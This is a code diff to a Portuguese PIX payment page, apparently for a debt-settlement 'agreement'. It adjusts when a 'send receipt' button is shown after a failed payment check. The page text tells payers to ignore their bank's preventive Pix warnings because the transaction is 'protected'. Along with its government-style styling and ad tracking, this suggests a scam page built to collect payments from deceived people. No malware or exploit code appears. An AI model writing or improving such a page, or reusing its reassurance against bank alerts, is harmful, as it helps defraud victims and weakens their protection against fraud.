@@ -92,7 +92,7 @@ footer small{color:#ffd1e8;font-size:11px}
       <button class="btn-copy" id="btn-copy" type="button">Copiar código PIX</button>
     </div>
     <button class="btn-check" id="btn-check" type="button">Verificar Pagamento<small>Após pagar no app do seu banco, clique aqui para validar seu pagamento</small></button>
-<button id="btn-comprovante" type="button" style="display:block;margin-top:10px;width:100%;padding:12px;border:1.5px solid #1351B4;background:#fff;color:#1351B4;font-weight:700;font-size:14px;border-radius:10px;cursor:pointer">📎 Enviar comprovante</button>
+<button id="btn-comprovante" type="button" style="display:none;margin-top:10px;width:100%;padding:12px;border:1.5px solid #1351B4;background:#fff;color:#1351B4;font-weight:700;font-size:14px;border-radius:10px;cursor:pointer">📎 Enviar comprovante</button>
     <div class="ok" id="paid-ok">Pagamento confirmado! Seu acordo foi ativado. ✅</div>
     <div class="err" id="pix-err">PIX ainda não identificado. Tente novamente em instantes.</div>
     <div class="warn"><div class="ic">i</div><div><b>Atenção:</b><br>Os bancos reforçaram a segurança do Pix e podem exibir avisos preventivos. Não se preocupe, sua transação está protegida.</div></div>
@@ -148,6 +148,8 @@ async function checkPix(manual){
       if(wait)wait.textContent='● Pagamento confirmado! Redirecionando... ✅';
       if(pollTimer){clearInterval(pollTimer);pollTimer=null;}
       btn.style.display='none';
+      var btnComp=document.getElementById('btn-comprovante');
+      if(btnComp)btnComp.style.display='none';
       try{localStorage.setItem('sr_pago','1');}catch(e){}
       try{
         var _m=(document.cookie.match(/_fbp=([^;]+)/)||[])[1]||'';
@@ -163,7 +165,12 @@ async function checkPix(manual){
       return true;
     }
     else{
-      if(manual){err.textContent='Pagamento ainda não identificado ('+(j.status||'pendente')+'). Tente novamente em instantes.';err.classList.add('show');}
+      if(manual){
+        err.textContent='Pagamento ainda não identificado ('+(j.status||'pendente')+'). Tente novamente em instantes.';
+        err.classList.add('show');
+        var btnComp=document.getElementById('btn-comprovante');
+        if(btnComp)btnComp.style.display='block';
+      }
       return false;
     }
   }catch(e){
@@ -243,18 +250,6 @@ setInterval(function(){
     }catch(e){ alert('Erro ao enviar comprovante.'); }
     send.disabled=false; send.textContent='Enviar';
   };
-  // Mostrar botão quando verificar pagamento falhar
-  var origCheck = window.checkPix;
-  // hook no btn-check click
-  var btnCheck=document.getElementById('btn-check');
-  if(btnCheck){
-    btnCheck.addEventListener('click', function(){
-      setTimeout(function(){
-        var err=document.getElementById('pix-err');
-        if(err && err.classList.contains('show') && btn){ btn.style.display='block'; }
-      }, 1600);
-    });
-  }
 })();
 </script>
 
